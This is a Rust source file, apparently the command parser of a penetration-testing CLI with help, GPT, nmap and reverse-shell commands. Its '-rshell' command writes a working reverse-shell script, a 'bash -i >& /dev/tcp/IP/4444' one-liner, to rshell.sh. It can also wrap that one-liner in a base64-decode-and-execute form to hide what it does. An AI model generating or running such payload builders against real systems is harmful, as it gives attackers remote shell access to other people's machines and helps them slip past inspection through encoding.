// Assuming this file is located at cli/parser.rs
use crate::cli::commands::command_trait::Command;
use crate::cli::commands::help::HelpCommand;
use crate::cli::commands::gpt::GptCommand;
use crate::cli::commands::nmap::NmapCommand;
use crate::cli::colors;
use std::env;
use std::collections::HashMap;
use std::fs::File;
use std::io::prelude::*;
use std::io::Result;

extern crate base64;

pub async fn parse_and_execute() {
    let command_args = parse_arguments();
    
    if command_args.is_empty() {
        println!("No command provided. Use -help for usage information.");
        return;
    }
    
    for (command, args) in command_args {
        let cli_args = args.join(" ");
        match command.as_str() {
            "-help" => {
                let cmd = HelpCommand;
                cmd.run(&cli_args).await;
            },
            "-gpt" => {
                let cmd = GptCommand;
                cmd.run(&cli_args).await;
            },
            "-nmap" => {
                let cmd = NmapCommand;
                cmd.run(&cli_args).await;
            },
            "-rshell" => {
                if args.len() > 0 {
                    let current_ip = args[0].to_owned();
                    if args.len() > 1 && args[1] == "create"
                    {
                        let mut use_base64 = false;
                        if args.len() > 2 && args[2] == "base64"{
                            use_base64 = true
                        }
                        //--- TODO --- set this to true or false depending on what the args are
                        match create_and_write_file("rshell","sh", use_base64, &current_ip) {
                            Ok(()) => println!("File written successfully"),
                            Err(e) => eprintln!("Failed to write file: {}", e),
                        }
                    }else{
                        println!("Use: -rshell ip create [opt=none|base64]");
                    }
                }else{
                    println!("Use: -rshell ip create [opt=none|base64]");
                }
            }

            _ => println!("{}Unknown command: [{}{}]{}",colors::BRIGHT_RED, colors::white(&command), colors::BRIGHT_RED, colors::RESET),
        }
    }
}

fn parse_arguments() -> HashMap<String, Vec<String>> {
    let args: Vec<String> = env::args().skip(1).collect();
    let mut map = HashMap::new();
    let mut current_key = String::new();

    for arg in args {
        if arg.starts_with('-') {
            current_key = arg.clone();
            map.entry(current_key.clone()).or_insert_with(Vec::new);
        } else {
            if let Some(v) = map.get_mut(&current_key) {
                v.push(arg);
            } else {
                // Handle the case where the argument doesn't start with '-'
                // You might want to handle it differently
                current_key = "".to_string();
                map.entry(current_key.clone()).or_insert_with(Vec::new).push(arg);
            }
        }
    }

    map
}

fn create_and_write_file(filename:&str,ext:&str,use_base_64:bool,ip:&str) -> Result<()> {
    let mut fpath = String::new(); // Make `fpath` mutable and initialize it as an empty string

    match env::current_dir() {
        Ok(path) => {
            fpath = path.display().to_string(); // Convert the `PathBuf` to a `String`
        },
        Err(e) => eprintln!("Error getting current directory: {}", e),
    }
    // Create a file, `File::create` will also truncate the file if it already exists
    let fname = format!("{}/{}.{}", fpath, filename, ext);
    println!("File Created: {}", colors::cyan(&fname));
    let mut file = File::create(&fname)?;

    let original_string = format!("bash -i >& /dev/tcp/{}/4444 0>&1",ip);
    // Write some text to the file
    if use_base_64 == true {
        let encoded_string = base64::encode(original_string);
        let content = format!("echo \"{}\" | base64 -d | sh", encoded_string);
        file.write_all(content.as_bytes())?;

    }else{
        file.write_all(original_string.as_bytes())?;
    }
    Ok(())
}
